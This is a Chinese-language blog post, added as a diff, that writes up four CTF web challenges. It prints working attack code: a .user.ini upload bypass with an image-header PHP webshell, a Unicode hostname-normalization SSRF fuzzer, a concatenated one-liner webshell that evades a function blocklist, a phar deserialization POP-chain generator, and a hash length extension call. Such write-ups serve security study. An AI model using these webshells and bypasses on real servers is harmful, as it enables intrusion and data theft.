@@ -1,0 +1,821 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Write UP,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="[SUCTF 2019]CheckInwp：https://xz.aliyun.com/t/6091 新姿势：.user.ini https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html 前提是含有.user.ini的文件夹下需要有正常的ph">
+<meta name="keywords" content="Write UP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUOJ_Web2">
+<meta property="og:url" content="http://yoursite.com/2019/09/18/BUUOJ_Web2/index.html">
+<meta property="og:site_name" content="V&#39;s blog">
+<meta property="og:description" content="[SUCTF 2019]CheckInwp：https://xz.aliyun.com/t/6091 新姿势：.user.ini https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html 前提是含有.user.ini的文件夹下需要有正常的ph">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2019/09/18/BUUOJ_Web2/20190826233021605.png">
+<meta property="og:updated_time" content="2019-09-18T14:13:10.711Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="BUUOJ_Web2">
+<meta name="twitter:description" content="[SUCTF 2019]CheckInwp：https://xz.aliyun.com/t/6091 新姿势：.user.ini https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html 前提是含有.user.ini的文件夹下需要有正常的ph">
+<meta name="twitter:image" content="http://yoursite.com/2019/09/18/BUUOJ_Web2/20190826233021605.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/09/18/BUUOJ_Web2/">
+
+
+
+
+
+  <title>BUUOJ_Web2 | V's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">V's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Daily life of a rookie</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/18/BUUOJ_Web2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="V">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="V's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">BUUOJ_Web2</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-18T11:02:35+08:00">
+                2019-09-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>wp：<a href="https://xz.aliyun.com/t/6091" target="_blank" rel="noopener">https://xz.aliyun.com/t/6091</a></p>
+<p>新姿势：<strong>.user.ini</strong></p>
+<p><a href="https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p>
+<p>前提是含有.user.ini的文件夹下需要有正常的php文件，</p>
+<p>但仔细推敲我们就会感到<strong>“上传目录下要有可执行的php文件”</strong>这个要求在文件上传中也比较苛刻，应该没有天才开发者会把上传文件放在主目录或者把php文件放在上传文件夹。</p>
+<p>但也不是全无办法，如果我们根据实际情况配合其他漏洞使用可能会有奇效，前段时间我遇到一个CMS对上传时的路径没有检测<code>../</code>，因此导致文件可被上传至任意目录，这种情况下我们就很有可能可以利用<code>.user.ini</code></p>
+<p>文件上传绕过姿势</p>
+<p>-&gt; 上传过滤为黑名单，但php脚本文件应该是无法上传的</p>
+<p>-&gt; 存在exif_imagetype()文件头过滤，需要添加图片文件的文件头</p>
+<p>-&gt; 文件的内容不能包含<code>&lt;?</code>，但可以上传<code>&lt;script language=&#39;php&#39;&gt;&lt;scirpt&gt;</code>类型的图片马来绕过</p>
+<ol>
+<li><p>上传用户配置php的文件.user.ini，是的每个页面包含我们的图片马</p>
+</li>
+<li><p>上传我们的图片马</p>
+</li>
+<li><p>访问目录中存在的页面（包含了我们的图片马），</p>
+</li>
+</ol>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=a.jpg</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">'php'</span>&gt;</span><span class="actionscript">system(<span class="string">'cat /flag'</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>（访问index.php后，显示GIF89a+flag{.*?}，全是我们图片马的内容，所以，index.php就是故意给我们利用的23333）</p>
+<h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p>wp：<a href="https://xz.aliyun.com/t/6042#toc-28" target="_blank" rel="noopener">https://xz.aliyun.com/t/6042#toc-28</a></p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">        </span><br><span class="line">        @app.route(<span class="string">'/getUrl'</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>])</span><br><span class="line">def getUrl():</span><br><span class="line">    url = request.<span class="keyword">args</span>.<span class="built_in">get</span>(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).<span class="built_in">hostname</span></span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 111"</span></span><br><span class="line">    parts = <span class="keyword">list</span>(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h in host.<span class="keyword">split</span>(<span class="string">'.'</span>):</span><br><span class="line">        newhost.<span class="keyword">append</span>(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.<span class="keyword">join</span>(newhost)</span><br><span class="line">    #去掉 url 中的空格</span><br><span class="line">    finalUrl = urlunsplit(parts).<span class="keyword">split</span>(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).<span class="built_in">hostname</span></span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).<span class="keyword">read</span>()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 333"</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</a></p>
+<p><img src="/2019/09/18/BUUOJ_Web2/20190826233021605.png" alt="1"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse,urlunsplit,urlsplit</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_unicode</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">65536</span>):</span><br><span class="line">        uni=chr(x)</span><br><span class="line">        url=<span class="string">"http://suctf.c&#123;&#125;"</span>.format(uni)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> getUrl(url):</span><br><span class="line">                print(<span class="string">"str: "</span>+uni+<span class="string">' unicode: \\u'</span>+str(hex(x))[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">(url)</span>:</span></span><br><span class="line">    url = url</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    get_unicode()</span><br></pre></td></tr></table></figure>
+
+<h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p>这一题，价格那里只允许输入一个字符</p>
+<p>而一个字符要表示大于一千多的数字</p>
+<p>再加上题目很容易联想的unicode</p>
+<p>这里推荐一个查各种神奇unicode的网站</p>
+<p><a href="https://www.compart.com/en/unicode/charsets" target="_blank" rel="noopener">https://www.compart.com/en/unicode/charsets</a></p>
+<p><a href="https://www.compart.com/en/unicode/U+1012D这个字符就可以表示30000" target="_blank" rel="noopener">https://www.compart.com/en/unicode/U+1012D这个字符就可以表示30000</a></p>
+<p>题目提示</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span><span class="comment">&lt;!--Ah,really important,seriously. --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>unicode utf-8 encoding 后是 0xF0 0x90 0x84 0xAD</p>
+<p>然后抓包，把0x改成%，发包即可。</p>
+<p>wp参考：<a href="https://github.com/hyperreality/ctf-writeups/tree/master/2019-asis" target="_blank" rel="noopener">https://github.com/hyperreality/ctf-writeups/tree/master/2019-asis</a></p>
+<h2 id="ByteCTF-2019-EZCMS"><a href="#ByteCTF-2019-EZCMS" class="headerlink" title="[ByteCTF 2019]EZCMS"></a>[ByteCTF 2019]EZCMS</h2><p>又是一个代码审计2333（话说文件上传都试试<a href="http://www.zip叭，毕竟黑盒的文件上传也太硬核了）" target="_blank" rel="noopener">www.zip叭，毕竟黑盒的文件上传也太硬核了）</a></p>
+<p>考点：哈希长度拓展攻击；phar反序列；字符串拼接过waf</p>
+<p>一句话木马：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$a=<span class="string">"syste"</span>;</span></span><br><span class="line"><span class="php">$b=<span class="string">"m"</span>;</span></span><br><span class="line"><span class="php">$c=$a.$b;</span></span><br><span class="line"><span class="php">$d=$c($_REQUEST[<span class="string">'a'</span>]);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>生成phar文件：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $filename;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $filepath;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $checker;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $filepath)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;filepath = $filepath;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;filename = $filename;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $username;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $password;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $admin;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$a = <span class="keyword">new</span> File(<span class="string">"altman"</span>,<span class="string">"altman"</span>);</span></span><br><span class="line"><span class="php">$a-&gt;checker = <span class="keyword">new</span> Profile();</span></span><br><span class="line"><span class="php">$a-&gt;checker-&gt;username = <span class="string">"/var/www/html/sandbox/a87136ce5a8b85871f1d0b6b2add38d2/.htaccess"</span>;</span></span><br><span class="line"><span class="php">$a-&gt;checker-&gt;password = ZipArchive::OVERWRITE | ZipArchive::CREATE;</span></span><br><span class="line"><span class="php">$a-&gt;checker-&gt;admin = <span class="keyword">new</span> ZipArchive();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> serialize($a);</span></span><br><span class="line"><span class="php">$phar = <span class="keyword">new</span> Phar(<span class="string">"1.phar"</span>);</span></span><br><span class="line"><span class="php">$phar-&gt;startBuffering();</span></span><br><span class="line"><span class="php">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span></span><br><span class="line"><span class="php">$phar-&gt;setMetadata($a); </span></span><br><span class="line"><span class="php">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span></span><br><span class="line"><span class="php">$phar-&gt;stopBuffering();</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>哈希长度拓展攻击</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">hash_sign</span> = hashpumpy.hashpump(sign, <span class="keyword">str1, </span><span class="keyword">str2, </span>key_lenth)</span><br></pre></td></tr></table></figure>
+
+<p>sign为 md5(key+str1)</p>
+<p>str2为要拼接的字符串</p>
+<p>这一题的利用点：</p>
+<ol>
+<li><p>首先利用hash拓展攻击绕过admin的check，因为upload_file方法中规定只有admin才能上传文件</p>
+</li>
+<li><p>上传的shell文件要绕过[‘system’,’eval’,’exec’,’+’,’passthru’,’`’,’assert’]等函数，所以拼接绕过</p>
+</li>
+<li><p>存在__destruct()函数调用checker类的upload_file()方法</p>
+</li>
+<li><p>Profile存在__call($name, $arguments)函数，会调用admin类的open方法</p>
+</li>
+<li><p>有admin类的只有Profile类，很显然是要call一个Profile类</p>
+</li>
+<li><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match('/^(phar|<span class="type">compress</span>|<span class="type">compose</span>.zlib|<span class="type">zip</span>|<span class="type">rar</span>|<span class="type">file</span>|<span class="type">ftp</span>|<span class="type">zlib</span>|<span class="type">data</span>|<span class="type">glob</span>|<span class="type">ssh</span>|<span class="type">expect</span>)/i', $this-&gt;filepath)</span><br></pre></td></tr></table></figure>
+
+<p>的过滤可以通过php://filter/resource=phar://绕过（是因为这个^符号）</p>
+</li>
+<li><p>查阅资料得到ZipArchive自带open方法，</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ZipArchive::<span class="built_in">open</span> ( <span class="keyword">string</span> $filename [, int $flags ] ) : mixed</span><br><span class="line"></span><br><span class="line">filename</span><br><span class="line">The <span class="built_in">file</span> name <span class="keyword">of</span> <span class="keyword">the</span> ZIP archive <span class="built_in">to</span> <span class="built_in">open</span>.</span><br><span class="line"></span><br><span class="line">flags</span><br><span class="line">The mode <span class="built_in">to</span> use <span class="built_in">to</span> <span class="built_in">open</span> <span class="keyword">the</span> archive</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>pop链：</p>
+<ol>
+<li>利用phar反序列化，首先生成File类，</li>
+<li>将File的cheker赋值为Profile类的对象</li>
+<li>File类调用__destruct方法，调用$cheker类即Profile对象的upload_file()方法</li>
+<li>由于Profile类不存在uoload_file()方法，故调用__call方法</li>
+<li>__call方法调用类admin的open方法，传参username以及password</li>
+<li>赋值admin为ZipArchive()对象，故调用ZipArchive()的open方法</li>
+<li>ZipArchive()调用.htaccess文件，方法为ZipArchive::OVERWRITE，即将.htaccess文件重写（删除）</li>
+<li>删除.htaccess文件后即可访问我们上传的shell文件获取shell</li>
+</ol>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Write-UP/" rel="tag"># Write UP</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/12/Linux 基基基基基基础/" rel="next" title="Linux 基基基基基基础">
+                <i class="fa fa-chevron-left"></i> Linux 基基基基基基础
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="V">
+            
+              <p class="site-author-name" itemprop="name">V</p>
+              <p class="site-description motion-element" itemprop="description">It is not ignorance and weakness but arrogance that destroys mankind</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                blogroll
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://fzwjscj.top/" title="fzwjscj" target="_blank">fzwjscj</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://dldxz.cn/" title="DLDXZ" target="_blank">DLDXZ</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://fanda.cloud/" title="fanda" target="_blank">fanda</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://passingfoam.com/" title="PassingFoam's blog" target="_blank">PassingFoam's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://eqqie.cn/" title="eqqie's blog" target="_blank">eqqie's blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SUCTF-2019-CheckIn"><span class="nav-number">1.</span> <span class="nav-text">[SUCTF 2019]CheckIn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SUCTF-2019-Pythonginx"><span class="nav-number">2.</span> <span class="nav-text">[SUCTF 2019]Pythonginx</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ASIS-2019-Unicorn-shop"><span class="nav-number">3.</span> <span class="nav-text">[ASIS 2019]Unicorn shop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ByteCTF-2019-EZCMS"><span class="nav-number">4.</span> <span class="nav-text">[ByteCTF 2019]EZCMS</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
